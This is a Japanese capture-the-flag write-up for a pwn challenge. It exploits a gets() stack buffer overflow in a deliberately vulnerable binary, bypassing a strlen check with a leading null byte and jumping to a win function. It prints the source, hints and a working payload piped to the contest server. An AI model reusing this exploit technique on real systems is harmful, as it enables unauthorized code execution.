# The sky's the limit:Pwn:268.23pts
あまりにも長い入力は危険らしいので弾くようにしました！  
`nc the_skys_the_limit.web.cpctf.space 30007`  

[配布ファイル](the_skys_the_limit.zip)  

**Hint1**  
脆弱性があるのは28行目のgets関数です。  
**Hint2**  
gets関数でbufよりも大きい文字列を入力できるため、stack buffer overflow の脆弱性があります。  
上手くwin関数に処理を飛ばしましょう。  
また、strlenでの文字列チェックに引っかからないようにするため、文字列の区切りとなるようなものを入力する文字列に仕込みましょう。  
stack alignment に注意してください。  
**Hint3 (解法)**  
'\x00'などを入力すると、そこが文字列の終端であるとみなされるため文字列長をごまかすことができます。  
これを踏まえてstack buffer over flow をしていきましょう。  
'\x00'を24文字、ret命令、win関数のアドレスの順に入力すればうまくいきそうです。  
`echo -e "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x13\x40\x00\x00\x00\x00\x00\x89\x12\x40\x00\x00\x00\x00\x00"`  
これをパイプなどで入力しましょう。  

# Solution
接続先とソースが配布される。  
ソースは以下の通りであった。  
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#define BUF_SIZE 16

int init(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	alarm(60);

	return 0;
}

int win() {
	system("cat flag.txt");

	return 0;
}

int main() {
	init();

	char buf[BUF_SIZE];

	printf("input:");
	gets(buf);

	if(strlen(buf) > BUF_SIZE) {
		printf("Too long.\n");
		exit(0);
	}

	return 0;
}
```
`gets`で自明なBOFがある。  
ただし`strlen`で入力を検証しており、16バイトより大きいと`Too long.`と怒られる。  
以下のようにセキュリティ機構をチェックする。  
```bash
$ checksec --file=./chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   46 Symbols        No    0               2               ./chall
```
Canaryは無いようだ。  
ここで`strlen`がヌルバイトまでの長さを見るのに対し、`gets`はヌルバイトを受け付けることに気づく。  
つまり、入力の16バイト以内にヌルバイトが存在する場合、`strlen`のチェックを常に通る。  
パディングの先頭にヌルバイトを付加して、ROPしてやればよい。  
スタックアラインメントの調整のためretを挟んで、winに飛ばしてやる。  
```bash
$ objdump -D ./chall | grep win -A 9
0000000000401289 <win>:
  401289:       f3 0f 1e fa             endbr64
  40128d:       55                      push   %rbp
  40128e:       48 89 e5                mov    %rsp,%rbp
  401291:       48 8d 05 6c 0d 00 00    lea    0xd6c(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
  401298:       48 89 c7                mov    %rax,%rdi
  40129b:       e8 30 fe ff ff          call   4010d0 <system@plt>
  4012a0:       b8 00 00 00 00          mov    $0x0,%eax
  4012a5:       5d                      pop    %rbp
  4012a6:       c3                      ret
$ echo -e "\x00AAAAAAAAAAAAAAAAAAAAAAA\xa6\x12\x40\x00\x00\x00\x00\x00\x89\x12\x40\x00\x00\x00\x00\x00" | nc the_skys_the_limit.web.cpctf.space 30007
input:CPCTF{Nu11_s7rin6_m4De_y0u_fr3E}Segmentation fault (core dumped)
```
flagが得られた。  

## CPCTF{Nu11_s7rin6_m4De_y0u_fr3E}